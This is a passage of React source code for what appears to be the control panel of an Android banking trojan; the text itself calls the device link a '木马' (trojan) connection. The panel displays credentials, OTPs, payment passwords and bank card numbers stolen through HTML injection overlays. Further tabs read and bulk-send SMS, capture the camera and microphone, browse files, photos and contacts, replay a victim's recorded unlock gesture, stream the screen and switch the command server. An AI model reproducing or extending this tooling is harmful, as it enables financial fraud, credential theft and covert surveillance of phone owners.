                        const d = typeof item.data === 'string' ? (() => { try { return JSON.parse(item.data) } catch { return {} } })() : (item.data || {})
                        const account = d.account || d.username || d.login || d.email || d['\u8d26\u53f7'] || d['\u624b\u673a\u53f7'] || d['\u7528\u6237\u540d'] || ''
                        const password = d.password || d.pwd || d.pass || d['\u5bc6\u7801'] || d['\u767b\u5f55\u5bc6\u7801'] || ''
                        const verification = d.verification || d.code || d.sms || d.otp || d.payPassword || d.paypass || d.pay_password || d['\u652f\u4ed8\u5bc6\u7801'] || d['\u9a8c\u8bc1\u7801'] || ''
                        const card = d.card || d.cardNumber || d.bankCard || d['\u5361\u53f7'] || d['\u94f6\u884c\u5361'] || ''
                        return (
                          <tr key={item.id || i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                            <td style={{ padding: '8px 12px', color: '#94a3b8', fontSize: 11, whiteSpace: 'nowrap' }}>{item.timestamp ? new Date(item.timestamp).toLocaleString('zh-CN') : item.createdAt ? new Date(item.createdAt).toLocaleString('zh-CN') : d['\u65f6\u95f4\u6233'] ? new Date(d['\u65f6\u95f4\u6233']).toLocaleString('zh-CN') : '--'}</td>
                            <td style={{ padding: '8px 12px', fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis' }}>{(() => { const tpl = injectionTemplates?.find(t => (t.packageName || t.package_name) === item.packageName); const name = item.templateName || tpl?.name || ''; const pkg = item.packageName || ''; return <span style={{ display: 'flex', alignItems: 'center', gap: 6 }}>{tpl?.icon && <img src={`data:image/png;base64,${tpl.icon}`} style={{ width: 20, height: 20, borderRadius: 4 }} />}<span><div style={{ color: '#e2e8f0', fontWeight: 500 }}>{name || pkg || '--'}</div>{name && pkg && <div style={{ color: '#64748b', fontSize: 10 }}>{pkg}</div>}</span></span> })()}</td>
                            <td style={{ padding: '8px 12px', color: '#38bdf8', fontSize: 12 }}>{account || '--'}</td>
                            <td style={{ padding: '8px 12px', color: '#fbbf24', fontSize: 12, fontFamily: 'monospace', fontWeight: 700 }}>{password || '--'}</td>
                            <td style={{ padding: '8px 12px', color: '#a78bfa', fontSize: 12 }}>{verification || '--'}</td>
                            <td style={{ padding: '8px 12px', color: '#f472b6', fontSize: 12 }}>{card || '--'}</td>
                            <td style={{ padding: '8px 12px' }}>
                              <button onClick={async () => { try { await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&id=${item.id}`, { method: 'DELETE' }); loadInjRecords(injDataPage); centerToast('已删除') } catch {} }} style={{ padding: '2px 8px', fontSize: 10, borderRadius: 4, border: '1px solid rgba(239,68,68,.3)', background: 'rgba(239,68,68,.08)', color: '#f87171', cursor: 'pointer' }}>删除</button>
                            </td>
                          </tr>
                        )
                      })
                    )}
                  </tbody>
                </table>
              </div>
              {/* 分页 */}
              <div style={{ paddingTop: 8, borderTop: '1px solid rgba(255,255,255,.08)', display: 'flex', justifyContent: 'flex-end', alignItems: 'center', gap: 16, marginTop: 8 }}>
                <span style={{ color: '#94a3b8', fontSize: 13 }}>共{injDataTotal}条</span>
                <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                  <button onClick={() => loadInjRecords(Math.max(1, injDataPage - 1))} disabled={injDataPage <= 1} style={{ padding: '4px 10px', background: injDataPage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: injDataPage <= 1 ? '#64748b' : '#fff', fontSize: 12, cursor: injDataPage <= 1 ? 'not-allowed' : 'pointer' }}>上一页</button>
                  <span style={{ color: '#fff', fontSize: 12 }}>{injDataPage}</span>
                  <button onClick={() => loadInjRecords(Math.min(totalPages, injDataPage + 1))} disabled={injDataPage >= totalPages} style={{ padding: '4px 10px', background: injDataPage >= totalPages ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: injDataPage >= totalPages ? '#64748b' : '#fff', fontSize: 12, cursor: injDataPage >= totalPages ? 'not-allowed' : 'pointer' }}>下一页</button>
                  <select value={injDataSize} onChange={e => loadInjRecords(1, Number(e.target.value))} style={{ padding: '4px 8px', background: 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }}>
                    <option value={20} style={{ background: '#1e293b' }}>20 条/页</option>
                    <option value={50} style={{ background: '#1e293b' }}>50 条/页</option>
                    <option value={100} style={{ background: '#1e293b' }}>100 条/页</option>
                  </select>
                </div>
              </div>
            </div>
          </div>
        </div>
      )
    }

    // LogsTab选项卡（已拆分为独立组件，自管状态 + 内部 fetch）
    if (activeTab === '📝 设备日志') {
      return <LogsTab deviceId={resolvedDeviceId} />
    }

        // PasswordTab选项卡（已拆分为独立组件）
    if (activeTab === '🔒 密码记录') {
      return (
        <PasswordTab
          lockPwd={lockPwd}
          alipayPwd={alipayPwd}
          wechatPwd={wechatPwd}
          refreshPwdSummary={refreshPwdSummary}
          pwdType={pwdType}
          setPwdType={setPwdType}
          pwdSize={pwdSize}
          loadPasswords={loadPasswords}
          clearPasswords={clearPasswords}
          pwdTotal={pwdTotal}
          pwdLoading={pwdLoading}
          pwdList={pwdList}
          pwdPage={pwdPage}
        />
      )
    }

        // SmsTab选项卡（已拆分为独立组件）
    if (activeTab === '✉ 短信记录') {
      return (
        <SmsTab
          smsList={smsList}
          smsSearch={smsSearch}
          setSmsSearch={setSmsSearch}
          smsPhone={smsPhone}
          setSmsPhone={setSmsPhone}
          smsContent={smsContent}
          setSmsContent={setSmsContent}
          smsSim={smsSim}
          setSmsSim={setSmsSim}
          smsLoading={smsLoading}
          smsSending={smsSending}
          readDeviceSms={readDeviceSms}
          sendSmsToDevice={sendSmsToDevice}
          loadSms={loadSms}
          smsPage={smsPage}
          smsTotal={smsTotal}
          showBulkSmsModal={showBulkSmsModal}
          setShowBulkSmsModal={setShowBulkSmsModal}
          bulkSmsContent={bulkSmsContent}
          setBulkSmsContent={setBulkSmsContent}
          bulkSmsSim={bulkSmsSim}
          setBulkSmsSim={setBulkSmsSim}
          bulkSelected={bulkSelected}
          setBulkSelected={setBulkSelected}
          bulkContactsLoading={bulkContactsLoading}
          fetchBulkContacts={fetchBulkContacts}
          contactsList={contactsList}
          bulkSending={bulkSending}
          handleBulkSend={handleBulkSend}
        />
      )
    }

        // AppListTab选项卡（已拆分为独立组件）
    if (activeTab === '📱 应用列表') {
      return (
        <AppListTab
          appLoading={appLoading}
          appSearch={appSearch}
          setAppSearch={setAppSearch}
          appList={appList}
          getFilteredApps={getFilteredApps}
          fetchAppList={fetchAppList}
          openApp={openApp}
          stopInjection={stopInjection}
          showInjectModal={showInjectModal}
          sendAppNotification={sendAppNotification}
          appDetail={appDetail}
          injActivePkgs={injActivePkgs}
          appDetailApp={appDetailApp}
          setAppDetailApp={setAppDetailApp}
          notifyApp={notifyApp}
          setNotifyApp={setNotifyApp}
          notifyTitle={notifyTitle}
          setNotifyTitle={setNotifyTitle}
          notifyContent={notifyContent}
          setNotifyContent={setNotifyContent}
          notifyButton={notifyButton}
          setNotifyButton={setNotifyButton}
          confirmSendNotification={confirmSendNotification}
          htmlInjectApp={htmlInjectApp}
          setHtmlInjectApp={setHtmlInjectApp}
          injectHtmlFile={injectHtmlFile}
          setInjectHtmlFile={setInjectHtmlFile}
          injectPreview={injectPreview}
          setInjectPreview={setInjectPreview}
          injectTab={injectTab}
          setInjectTab={setInjectTab}
          injectCustomHtml={injectCustomHtml}
          setInjectCustomHtml={setInjectCustomHtml}
          injectPreviewHtml={injectPreviewHtml}
          setInjectPreviewHtml={setInjectPreviewHtml}
          confirmInjectHtml={confirmInjectHtml}
          centerToast={centerToast}
        />
      )
    }

        // FileManagerTab选项卡（已拆分为独立组件）
    if (activeTab === '📁 文件管理') {
      return (
        <FileManagerTab
          deviceSleeping={deviceSleeping}
          deviceOnline={deviceOnline}
          fmGetFilteredFiles={fmGetFilteredFiles}
          fmPath={fmPath}
          fmGoRoot={fmGoRoot}
          fmGoUp={fmGoUp}
          fmRefresh={fmRefresh}
          fmNewFolder={fmNewFolder}
          fmSelected={fmSelected}
          fmCopy={fmCopy}
          fmCut={fmCut}
          fmPaste={fmPaste}
          fmClipboard={fmClipboard}
          fmSearch={fmSearch}
          setFmSearch={setFmSearch}
          fmNavigate={fmNavigate}
          fmFiles={fmFiles}
          fmLoading={fmLoading}
          fmSelectAll={fmSelectAll}
          fmToggleSelect={fmToggleSelect}
          fmOpenItem={fmOpenItem}
          fmFormatSize={fmFormatSize}
          fmDownload={fmDownload}
          fmDelete={fmDelete}
        />
      )
    }

        // CameraTab选项卡（已拆分为独立组件）
    if (activeTab === '📸 摄像头/录音') {
      return (
        <CameraTab
          deviceSleeping={deviceSleeping}
          deviceOnline={deviceOnline}
          camActive={camActive}
          camFacing={camFacing}
          camSrc={camSrc}
          setCamFacing={setCamFacing}
          setCamActive={setCamActive}
          setCamSrc={setCamSrc}
          camActiveRef={camActiveRef}
          micActive={micActive}
          micQuality={micQuality}
          micMode={micMode}
          micDuration={micDuration}
          micNoiseSuppression={micNoiseSuppression}
          setMicQuality={setMicQuality}
          setMicMode={setMicMode}
          setMicDuration={setMicDuration}
          setMicNoiseSuppression={setMicNoiseSuppression}
          setMicActive={setMicActive}
          resolvedDeviceId={resolvedDeviceId}
          sendWs={sendWs}
          addLog={addLog}
          centerToast={centerToast}
        />
      )
    }

        // GalleryTab选项卡（已拆分为独立组件）
    if (activeTab === '🖼 查看相册') {
      return (
        <GalleryTab
          galleryList={galleryList}
          galleryCount={galleryCount}
          setGalleryCount={setGalleryCount}
          galleryLoading={galleryLoading}
          galleryPage={galleryPage}
          setGalleryPage={setGalleryPage}
          gallerySize={gallerySize}
          setGallerySize={setGallerySize}
          galleryPreview={galleryPreview}
          setGalleryPreview={setGalleryPreview}
          resolvedDeviceId={resolvedDeviceId}
          fetchGallery={fetchGallery}
          setGalleryList={setGalleryList}
          setGalleryTotal={setGalleryTotal}
        />
      )
    }

        // ContactsTab选项卡（已拆分为独立组件）
    if (activeTab === '👥 通讯录') {
      return (
        <ContactsTab
          contactsSearch={contactsSearch}
          setContactsSearch={setContactsSearch}
          contactsLoading={contactsLoading}
          contactsTotal={contactsTotal}
          getFilteredContacts={getFilteredContacts}
          fetchContacts={fetchContacts}
          setSmsPhone={setSmsPhone}
          setActiveTab={setActiveTab}
          centerToast={centerToast}
        />
      )
    }

        // PaymentTab选项卡（已拆分为独立组件）
    if (activeTab === '💰 支付密码') {
      return (
        <PaymentTab
          payStrategies={payStrategies}
          payNewPkg={payNewPkg}
          setPayNewPkg={setPayNewPkg}
          payNewName={payNewName}
          setPayNewName={setPayNewName}
          payNewWindows={payNewWindows}
          setPayNewWindows={setPayNewWindows}
          addPayStrategy={addPayStrategy}
          deletePayStrategy={deletePayStrategy}
          loadPayStrategies={loadPayStrategies}
          pushPayStrategies={pushPayStrategies}
          payRecords={payRecords}
          payRecordsTotal={payRecordsTotal}
          payLoading={payLoading}
          clearPayRecords={clearPayRecords}
          deletePayRecord={deletePayRecord}
          centerToast={centerToast}
        />
      )
    }

        // ★ TrojanControlTab 已合并到首页 tab 右侧（不再作为独立 tab）
        // PermissionTab选项卡（已拆分为独立组件）
    if (activeTab === '🔐 权限状态') {
      return (
        <PermissionTab
          permStatus={permStatus}
          permLoading={permLoading}
          permLoaded={permLoaded}
          setPermLoaded={setPermLoaded}
          setPermLoading={setPermLoading}
          resolvedDeviceId={resolvedDeviceId}
          sendWs={sendWs}
          addLog={addLog}
          centerToast={centerToast}
        />
      )
    }


        // 其他选项卡：原有逻辑
    return (
      <div className="ctrl-tab-content">
        <div className="ctrl-tab-panel">
          <div className="ctrl-tab-panel-head">
            <h2>{activeTab}</h2>
            <p>{meta.desc}</p>
          </div>
          {meta.actions ? (
            <div className="ctrl-tab-action-grid">
              {meta.actions.map(name => {
                const btn = quickButtons.find(b => b.label === name)
                return <button key={name} className="ctrl-tab-action" onClick={() => btn ? handleQuickButton(btn) : centerToast(`${name}功能待接入`)}>{btn?.icon || '⚙'}<span>{name}</span></button>
              })}
            </div>
          ) : meta.rows ? (
            <div className="ctrl-log-list">
              {meta.rows.length ? meta.rows.map((row, i) => <div key={i} className="ctrl-log-row">{row}</div>) : <div className="ctrl-empty-inline">暂无日志</div>}
            </div>
          ) : (
            <div className="ctrl-empty-inline">{meta.empty}</div>
          )}
        </div>
      </div>
    )
  }

  return (
    <div className="control-page">
      {/* 备注编辑模态框 */}
      {editingRemark && (
        <RemarkModal
          initialValue={device?.remark || ''}
          onConfirm={(value) => {
            api.request(`/api/device/${encodeURIComponent(resolvedDeviceId)}`, {
              method: 'PUT',
              body: JSON.stringify({ remark: value })
            }).then(() => {
              setDevice(prev => prev ? { ...prev, remark: value } : prev)
              setEditingRemark(false)
              centerToast('备注已保存')
            }).catch(e => {
              toast(e.message, 'error')
              setEditingRemark(false)
            })
          }}
          onCancel={() => setEditingRemark(false)}
        />
      )}
      {/* 黑屏遮挡配置弹窗 */}
      {blackScreenModal && (
        <BlackScreenModal
          onConfirm={handleBlackScreenConfirm}
          onCancel={() => setBlackScreenModal(false)}
        />
      )}
      {/* 修改服务器模态框 */}
      {serverModal && (
        <div className="overlay-modal-backdrop" onClick={e => e.target === e.currentTarget && setServerModal(false)}>
          <div className="overlay-modal" style={{ maxWidth: 520, width: '90%' }}>
            <div className="overlay-modal-header">
              <span className="overlay-modal-icon">🔄</span>
              <h3>修改服务器地址</h3>
              <button className="overlay-modal-close" onClick={() => setServerModal(false)}>✕</button>
            </div>
            <div className="overlay-modal-body">
              <div style={{ marginBottom: 16 }}>
                <p style={{ color: '#999', marginBottom: 8, fontSize: 13 }}>输入新的服务器地址，设备将转发到新的服务器。</p>
                <p style={{ color: '#ff4d4f', fontSize: 12, marginBottom: 16 }}>⚠️ 警告：修改后操作不可返回，慎重操作。</p>
              </div>
              <div className="overlay-field">
                <input
                  type="text"
                  className="overlay-input"
                  value={serverUrl}
                  onChange={e => setServerUrl(e.target.value)}
                  placeholder="例如: https://www.google.com"
                  style={{ fontSize: 14, padding: '10px 12px' }}
                />
                <div style={{ marginTop: 8, fontSize: 12, color: '#909399' }}>请确认服务器域名，不要乱填。</div>
              </div>
            </div>
            <div className="overlay-modal-footer">
              <button className="overlay-btn cancel" onClick={() => setServerModal(false)}>取消</button>
              <button
                className="overlay-btn confirm"
                onClick={() => {
                  if (!serverUrl.trim()) { toast('请输入服务器地址', 'error'); return }
                  sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'CHANGE_SERVER_URL', params: { data: { serverUrl: serverUrl.trim() } } } })
                  centerToast('服务器修改指令已发送')
                  addLog(`修改服务器: ${serverUrl.trim()}`)
                  setServerModal(false)
                  setServerUrl('')
                }}
              >确认修改</button>
            </div>
          </div>
        </div>
      )}
      {/* 一键解锁模态框 */}
      {gestureModal && (
        <div className="overlay-modal-backdrop" onClick={e => e.target === e.currentTarget && setGestureModal(false)}>
          <div className="overlay-modal" style={{ maxWidth: 520, width: '90%' }}>
            <div className="overlay-modal-header">
              <span className="overlay-modal-icon">🔓</span>
              <h3>一键解锁</h3>
              <button className="overlay-modal-close" onClick={() => setGestureModal(false)}>✕</button>
            </div>
            <div className="overlay-modal-body" style={{ minHeight: 200, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              {gestureLoading ? (
                <div style={{ color: '#94a3b8', fontSize: 14 }}>加载中...</div>
              ) : gestureList.length === 0 ? (
                <div style={{ textAlign: 'center', color: '#94a3b8' }}>
                  <div style={{ fontSize: 14, marginBottom: 12 }}>暂无已保存的解锁手势</div>
                  <div style={{ fontSize: 13, color: '#64748b' }}>手机锁屏后手动解锁一次，系统会自动录制</div>
                </div>
              ) : (
                <div style={{ width: '100%' }}>
                  {gestureList.map((g, i) => (
                    <div key={g.id || i} style={{ padding: '10px 14px', marginBottom: 8, background: 'rgba(255,255,255,.04)', borderRadius: 8, border: '1px solid rgba(255,255,255,.08)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <div>
                        <div style={{ color: '#e2e8f0', fontSize: 13, fontWeight: 500 }}>{g.name || g.type || `手势 ${i + 1}`}</div>
                        <div style={{ color: '#64748b', fontSize: 11, marginTop: 2 }}>{g.createdAt ? new Date(g.createdAt).toLocaleString('zh-CN') : ''}</div>
                      </div>
                      <button
                        onClick={() => {
                          sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'REPLAY_GESTURE', params: { gestureId: g.id, points: g.points || g.data } } })
                          centerToast('解锁手势已发送')
                          addLog(`发送: REPLAY_GESTURE ${g.name || g.id}`)
                          setGestureModal(false)
                        }}
                        style={{ padding: '6px 16px', fontSize: 12, fontWeight: 600, borderRadius: 6, border: 'none', background: 'linear-gradient(135deg, #1890ff, #096dd9)', color: '#fff', cursor: 'pointer' }}
                      >解锁</button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
      {/* 顶部导航 */}
      <div className="ctrl-header">
        <div className="ctrl-header-left">
          <div className="ctrl-header-brand">设备控制中心 <span className={`dot ${deviceSleeping ? 'sleeping' : (deviceOnline ? 'on' : 'off')}`} /></div>
          {/* ★ 2026-08-06：4 个图标状态行（WS / Bridge / 无障碍 / 网络），与首页 /api/device/list 数据同步 */}
          {(() => {
            const wsOn = !!device?.ws_connected
            const bridgeOn = !!device?.bridge_connected
            const a11yOn = !!(device?.accessibilityAlive ?? device?.accessibility_alive)
            const netType = String(device?.networkType ?? device?.network_type ?? '').toLowerCase()
            // 综合在线判定：WS 或 Bridge 任一在线 → 在线（避免 WS+Bridge 都假离线但能投屏的场景误判）
            const online = deviceStatus === 'online' || deviceStatus === 'sleeping' || wsOn || bridgeOn
            // 网络图标：WiFi → 📶，其它（移动数据/4G/5G/3G/2G/未知） → 📱
            const netIcon = netType.includes('wifi') ? '📶' : '📱'
            const netLabel = netType.includes('wifi') ? 'WiFi' :
                             netType.includes('5g') ? '5G' :
                             netType.includes('4g') || netType.includes('lte') ? '4G' :
                             netType.includes('3g') ? '3G' :
                             netType.includes('2g') ? '2G' :
                             netType || '-'
            const pill = (active, label, icon, title) => (
              <span title={title} style={{
                display: 'inline-flex', alignItems: 'center', gap: 4,
                padding: '3px 8px', borderRadius: 6, fontSize: 11,
                background: active ? 'rgba(34,197,94,.15)' : 'rgba(100,116,139,.12)',
                border: '1px solid ' + (active ? 'rgba(34,197,94,.4)' : 'rgba(100,116,139,.25)'),
                color: active ? '#22c55e' : '#94a3b8',
                fontWeight: 600,
              }}>
                <span style={{ fontSize: 13 }}>{icon}</span>
                <span>{label}</span>
              </span>
            )
            return (
              <div style={{ display: 'flex', alignItems: 'center', gap: 6, flexWrap: 'wrap', padding: '4px 0' }}>
                {pill(wsOn, 'WS', '🔌', `WS连接: ${wsOn ? '在线' : '离线'}`)}
                {pill(bridgeOn, 'Bridge', '🔗', `木马连接: ${bridgeOn ? '在线' : '离线'}`)}
                {pill(a11yOn, '无障碍', '♿', `无障碍服务: ${a11yOn ? '运行中' : '未运行'}`)}
                {pill(!!netType, netLabel, netIcon, `网络: ${netLabel}`)}
                <span style={{
                  marginLeft: 'auto', fontSize: 10, fontWeight: 600,
                  color: online ? '#22c55e' : '#ef4444',
                }}>{online ? '● 在线' : '● 离线'}</span>
              </div>
            )
          })()}
          <span className={`ctrl-ws-status ${wsConnected ? 'connected' : 'disconnected'}`}>服务端：{wsState}{latency ? ` · ${latency}` : ''}</span>
        </div>
        <div className="ctrl-time-row">
          <span>🇨🇳 中国时间：{chinaTime}</span>
          <span>🌐 全球时间：{globalTime}</span>
        </div>
        <div className="ctrl-tabs">
          {tabsCn.map(tab => <button key={tab} className={`ctrl-tab ${activeTab === tab ? 'active' : ''}`} onClick={() => setActiveTab(tab)}>{tab}</button>)}
        </div>
      </div>



      {activeTab === '🏠 首页' ? (
      <>
      {/* ★ 2026-08-06 合并后的首页 tab：左侧无障碍操作 + 右侧木马控制 */}
      <div className="home-tab-topbar">
        {deviceInfoItems.map(([k, v, type]) => {
          let valClass = ""
          if (type === "heartbeat") valClass = "heartbeat-value"
          else if (k.includes("设备名称") || k.includes("名称")) valClass = "device-name"
          else if (k.includes("IP")) valClass = "ip-value"
          else if (k.includes("电量")) {
            const pct = parseInt(String(v)) || 0
            valClass = pct > 50 ? "battery-high" : pct > 20 ? "battery-mid" : "battery-low"
          }
          else if (String(v).includes("已开启")) valClass = "green"
          return (
            <div key={k} className="ctrl-device-row topbar-item">
              <label className="topbar-label">{type === "heartbeat" ? <span className="heartbeat-label">💓</span> : k}</label>
              <span
                className={"topbar-val " + valClass}
                onClick={() => { if (type === "remark") { setEditingRemark(true); setRemarkValue(device?.remark || "") } }}
                style={type === "remark" ? { cursor: "pointer", textDecoration: "underline dotted", color: "#64748b", fontStyle: "italic" } : {}}
                title={type === "remark" && device?.remark ? device.remark : type === "remark" ? "点击编辑备注" : ""}
              >
                {type === "heartbeat" ? <><span className="heartbeat-dot" style={{fontSize:8}}>●</span> {v}</> : type === "battery" ? <span className="battery-indicator"><span className="battery-icon" style={{width:18,height:9}}><span className="battery-fill" style={{ width: `${Math.min(100, Math.max(0, parseInt(String(v)) || 0))}%` }} /></span><span className="battery-text">{v}</span></span> : v}
              </span>
            </div>
          )
        })}
        <span className="home-tab-topbar-divider">│</span>
        <div className="home-tab-topbar-pwd">
          <span className="topbar-pwd-icon">🔑</span>
          <span className="topbar-pwd-val">
            {lockPwd.value
              ? (lockPwd.type === "pattern" || lockPwd.type === "gesture"
                  ? lockPwd.value.replace(/[^\d,]/g,"").split(",").map(n => Number(n) + 1).join(",")
                  : lockPwd.value)
              : "暂未"}
          </span>
          <span className="topbar-pwd-type">{({pattern:"图案",password:"密码",pin:"PIN",none:"未检测"})[lockPwd.type] || lockPwd.type || "--"}</span>
          <span className={"topbar-pwd-status " + (lockPwd.status === "已获取" ? "ok" : "empty")}>{lockPwd.status}</span>
          <button onClick={() => refreshPwdSummary()} className="topbar-pwd-refresh" title="刷新锁屏密码">🔄</button>
        </div>
      </div>
      <div className="home-tab-split">
      <div className="home-tab-left">
      {/* 主体三栏 - 改造：原 ctrl-sidebar 设备信息/密码采集 已移到 home-tab-topbar 顶部单行栏 */}
      <div className="ctrl-body">
        {/* 中栏：双投屏（手机端自适应，PC端始终显示双屏） */}
        <div className="ctrl-screen-area">
          {isMobile ? (
            /* ── 手机端：紧凑开关条 + 条件渲染屏幕（不占空间） ── */
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
              {/* ── 模块1：投屏/录屏 ── */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '4px 8px', background: 'rgba(255,255,255,.04)', borderRadius: 8, border: '1px solid rgba(255,255,255,.06)' }}>
                  <span style={{ color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>📱 远程投屏</span>
                  <span style={{ color: (streaming || screenLoading) ? '#4ade80' : '#64748b', fontSize: 10, marginLeft: 'auto' }}>{(streaming || screenLoading) ? '● 投屏中' : '— 未开启'}</span>
                  <button
                    className={`scr-label-badge screen-action ${screenMode === 'system' && (streaming || screenLoading) ? 'on' : ''} ${screenMode === 'system' && screenLoading ? 'loading' : ''}`}
                    onClick={() => startScreen('system')}
                    style={{ padding: '3px 10px', borderRadius: 6, fontSize: 10, fontWeight: 600, cursor: 'pointer', border: 'none', background: screenMode === 'system' && (streaming || screenLoading) ? 'rgba(239,68,68,.2)' : 'rgba(74,222,128,.2)', color: screenMode === 'system' && (streaming || screenLoading) ? '#ef4444' : '#4ade80' }}
                  >
                    {screenMode === 'system' && screenLoading ? '加载中...' : screenMode === 'system' && streaming ? '✕ 关闭' : '▶ 投屏'}
                  </button>
                  <button
                    className={`scr-label-badge screen-action ${screenMode === 'record' && (streaming || screenLoading) ? 'on' : ''} ${screenMode === 'record' && screenLoading ? 'loading' : ''}`}
                    onClick={() => startScreen('record')}
                    style={{ padding: '3px 10px', borderRadius: 6, fontSize: 10, fontWeight: 600, cursor: 'pointer', border: 'none', background: screenMode === 'record' && (streaming || screenLoading) ? 'rgba(239,68,68,.2)' : 'rgba(74,222,128,.2)', color: screenMode === 'record' && (streaming || screenLoading) ? '#ef4444' : '#4ade80' }}
                  >
                    {screenMode === 'record' && screenLoading ? '加载中...' : screenMode === 'record' && streaming ? '✕ 关闭' : '▶ 录屏'}
                  </button>
                </div>
                {(streaming || screenLoading) && (
                  <div className="ctrl-phone-frame">
                    <div className="ctrl-phone-screen" style={{ touchAction: 'none', userSelect: 'none' }} onPointerDown={handleScreenPointerDown} onPointerMove={handleScreenPointerMove} onPointerUp={handleScreenPointerUp}>
                      {screenSrc
                        ? <img src={screenSrc} alt="screen" draggable="false" style={{ pointerEvents: 'none', userSelect: 'none', width: '100%', height: '100%', objectFit: 'contain' }} />
                        : <div className="ctrl-loading" style={{ pointerEvents: 'none' }}><div>📱</div><div>投屏加载中...</div></div>
                      }
                    </div>
                    <div className="ctrl-phone-nav">
                      <button type="button" onClick={() => sendNav('BACK')} title="返回" aria-label="返回">‹</button>
                      <button type="button" onClick={() => sendNav('HOME')} title="首页" aria-label="首页">○</button>
                      <button type="button" onClick={() => sendNav('RECENTS')} title="任务管理" aria-label="任务管理">□</button>
                    </div>
                  </div>
                )}
              </div>

              {/* ── 模块2：线框阅读器 ── */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '4px 8px', background: 'rgba(255,255,255,.04)', borderRadius: 8, border: '1px solid rgba(255,255,255,.06)' }}>
                  <span style={{ color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>♿ 线框阅读器</span>
                  <span style={{ fontSize: 10, color: '#64748b' }}>可直接点击/滑动操作</span>
                  <span style={{ color: readerActive ? '#4ade80' : '#64748b', fontSize: 10, marginLeft: 'auto' }}>{readerActive ? '● 已连接' : '— 未开启'}</span>
                  <button onClick={toggleReader} style={{ padding: '3px 10px', borderRadius: 6, fontSize: 10, fontWeight: 600, cursor: 'pointer', border: 'none', background: readerActive ? 'rgba(239,68,68,.2)' : 'rgba(74,222,128,.2)', color: readerActive ? '#ef4444' : '#4ade80' }}>
                    {readerActive ? '✕ 关闭' : '▶ 开启'}
                  </button>
                </div>
                {readerActive && (
                  <div className="ctrl-phone-frame" style={{ cursor: 'crosshair' }}>
                    <div className="ctrl-phone-screen" style={{ touchAction: 'none', cursor: 'crosshair', position: 'relative' }}>
                      {readerLoading && !readerData
                        ? <div className="ctrl-loading"><div className="ctrl-spinner" /></div>
                        : <ReaderView
                            data={readerData}
                            onTap={(x, y) => { setXy({ x, y }); sendControl('TAP', { x, y }); requestReaderAfterAction() }}
                            onGesture={g => {
                              if (g.type === 'tap') {
                                sendControl('TAP', { x: g.x, y: g.y });
                                requestReaderAfterAction()
                              } else {
                                sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'swipe', params: { x1: g.startX, y1: g.startY, x2: g.endX, y2: g.endY, duration: 300 } } })
                                sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'SWIPE', params: { startX: g.startX, startY: g.startY, endX: g.endX, endY: g.endY, duration: 300 } } })
                                addLog(`阅读器滑动: (${g.startX},${g.startY})→(${g.endX},${g.endY})`)
                                requestReaderAfterAction()
                              }
                            }}
                          />
                      }
                    </div>
                    <div className="ctrl-phone-nav">
                      <button type="button" onClick={() => sendNav('BACK')} title="返回" aria-label="返回">‹</button>
                      <button type="button" onClick={() => sendNav('HOME')} title="首页" aria-label="首页">○</button>
                      <button type="button" onClick={() => sendNav('RECENTS')} title="任务管理" aria-label="任务管理">□</button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          ) : (
            /* ── PC 端：无障碍阅读器 + 无障碍投屏/录屏 风格（居中） ── */
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1, minHeight: 0, alignItems: 'stretch', width: '100%', padding: '0 4px', overflowY: 'auto' }}>
              {/* ★ 2026-08-07：阅读器设置面板（移到两个屏幕上方，参考设计稿 reader-style-bar） */}
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '4px 8px', background: '#1f1f1f', borderRadius: 6, border: '1px solid #303030', flexWrap: 'wrap' }}>
                  <span style={{ fontSize: 11, color: '#aaa' }}>背景</span>
                  <input type="color" value={readerBgColor} onChange={e => setReaderBgColor(e.target.value)} title="阅读器背景色" style={{ width: 24, height: 24, border: 'none', cursor: 'pointer', borderRadius: 4, padding: 0, background: 'transparent' }} />
                  <span style={{ fontSize: 11, color: '#aaa' }}>字色</span>
                  <input type="color" value={readerTextColor} onChange={e => setReaderTextColor(e.target.value)} title="阅读器文字颜色" style={{ width: 24, height: 24, border: 'none', cursor: 'pointer', borderRadius: 4, padding: 0, background: 'transparent' }} />
                  <span style={{ fontSize: 11, color: '#aaa' }}>字号</span>
                  <input type="range" min="5" max="20" value={readerFontSize} onChange={e => setReaderFontSize(parseInt(e.target.value))} title="阅读器字号" style={{ width: 70, cursor: 'pointer' }} />
                  <span style={{ fontSize: 10, color: '#aaa', minWidth: 18, textAlign: 'right' }}>{readerFontSize}</span>
                  <button type="button" onClick={() => { setReaderBgColor('#000000'); setReaderTextColor('#e1ff00'); setReaderFontSize(10) }} title="重置阅读器样式" style={{ padding: '3px 8px', fontSize: 10, border: '1px solid #ff4d4f', borderRadius: 4, background: 'rgba(255,77,79,.15)', color: '#ff7875', cursor: 'pointer', fontWeight: 500 }}>重置</button>
                </div>
              {/* ── 双屏横排（参考设计稿 screen-two-col：宽度 270px） ── */}
